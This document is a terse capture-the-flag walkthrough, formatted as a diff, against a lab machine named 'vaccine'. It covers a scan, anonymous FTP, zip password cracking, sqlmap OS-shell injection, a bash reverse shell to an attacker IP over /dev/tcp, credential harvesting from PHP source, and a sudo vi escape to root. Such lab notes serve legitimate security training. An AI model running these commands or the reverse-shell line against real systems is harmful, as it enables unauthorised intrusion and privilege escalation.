@@ -1,0 +1,142 @@
+Nmap scan report for 10.129.9.80
+Host is up (0.073s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.10.14.15
+|      Logged in as ftpuser
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
+|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
+|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: MegaCorp Login
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+┌──(root㉿kali)-[~/Downloads]
+└─# ftp 10.129.9.80   
+Connected to 10.129.9.80.
+220 (vsFTPd 3.0.3)
+Name (10.129.9.80:root): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> dir
+229 Entering Extended Passive Mode (|||10689|)
+150 Here comes the directory listing.
+-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
+226 Directory send OK.
+ftp> get backup.zip
+
+┌──(root㉿kali)-[~/Downloads]
+└─# zip2john backup.zip > zip.hash 
+ver 2.0 efh 5455 efh 7875 backup.zip/index.php PKZIP Encr: TS_chk, cmplen=1201, decmplen=2594, crc=3A41AE06 ts=5722 cs=5722 type=8
+ver 2.0 efh 5455 efh 7875 backup.zip/style.css PKZIP Encr: TS_chk, cmplen=986, decmplen=3274, crc=1B1CCD6A ts=989A cs=989a type=8
+NOTE: It is assumed that all files in each archive have the same password.
+If that is not the case, the hash may be uncrackable. To avoid this, use
+option -o to pick a file at a time.
+                                                                                             
+┌──(root㉿kali)-[~/Downloads]
+└─# john zip.hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 2 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst
+741852963        (backup.zip)   
+
+>> index.php >>
+
+<?php
+session_start();
+  if(isset($_POST['username']) && isset($_POST['password'])) {
+    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
+      $_SESSION['login'] = "true";
+      header("Location: dashboard.php");
+    }
+  }
+admin : qwerty789 
+
+http://10.129.9.80/dashboard.php
+
+┌──(root㉿kali)-[~/Downloads]
+└─# sqlmap 10.129.41.150 -u http://10.129.41.150/dashboard.php?search=test --cookie 'PHPSESSID=4rlj6v5hh8r77tchltulnhkhto' --os-shell
+
+|| nc -lvlp 12342
+
+os-shell> bash -c "bash -i >& /dev/tcp/10.10.14.64/1234 0>&1"
+
+>> cat /etc/passwd
+>> cat /var/www/html/dashboard.php
+
+        try {
+          $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
+
+┌──(root㉿kali)-[~/Downloads]
+└─# ssh postgres@10.129.41.150
+		password=P@s5w0rd!
+
+postgres@vaccine:~$ cat user.txt
+ec9b13ca4d6229cd5cc1e09980965bf7
+
+postgres@vaccine:~/11/main$ sudo -l
+[sudo] password for postgres: 
+Matching Defaults entries for postgres on vaccine:
+    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
+    XFILESEARCHPATH XUSERFILESEARCHPATH",
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    mail_badpass
+
+User postgres may run the following commands on vaccine:
+    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
+
+postgres@vaccine:~/11/main$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+:set shell=/bin/sh
+:shell
+# whoami
+root
+#cd ~ >> cat root.txt
+dd6e058e814260bc70e9bbdef2715849
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
